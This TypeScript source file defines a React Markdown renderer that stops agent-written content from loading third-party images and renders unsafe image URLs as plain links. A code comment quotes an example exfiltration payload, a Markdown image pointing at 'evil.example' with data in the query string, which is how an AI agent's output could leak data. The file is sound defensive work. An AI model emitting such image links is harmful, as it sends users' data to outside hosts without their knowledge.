import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { cn } from "@/lib/utils";

/**
 * Only same-origin paths and inline data images may load automatically. Anything else (an agent-written
 * `![](https://evil.example/p.gif?d=…)`) would leak data the moment someone opens the page, so it renders as a link.
 */
function isSafeImageSrc(src: string): boolean {
  if (/^data:image\/(png|jpe?g|gif|webp);base64,/i.test(src)) return true;
  return src.startsWith("/") && !src.startsWith("//") && !src.startsWith("/\\");
}

/** Safe markdown renderer for agent/user content (no raw HTML, no third-party image loads). */
export function Markdown({ children, className }: { children: string; className?: string }) {
  return (
    <div className={cn("prose-roster", className)}>
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        components={{
          a: ({ href, children }) => (
            <a href={href} target="_blank" rel="noopener noreferrer nofollow" referrerPolicy="no-referrer">
              {children}
            </a>
          ),
          img: ({ src, alt }) => {
            const url = typeof src === "string" ? src : "";
            if (url && isSafeImageSrc(url)) {
              // eslint-disable-next-line @next/next/no-img-element
              return <img src={url} alt={alt ?? ""} loading="lazy" referrerPolicy="no-referrer" />;
            }
            if (!/^https?:\/\//i.test(url)) return <span>{alt || "image"}</span>;
            return (
              <a href={url} target="_blank" rel="noopener noreferrer nofollow" referrerPolicy="no-referrer">
                {alt || "Open image"}
              </a>
            );
          },
          table: ({ children }) => (
            <div className="overflow-x-auto">
              <table>{children}</table>
            </div>
          ),
        }}
      >
        {children}
      </ReactMarkdown>
    </div>
  );
}
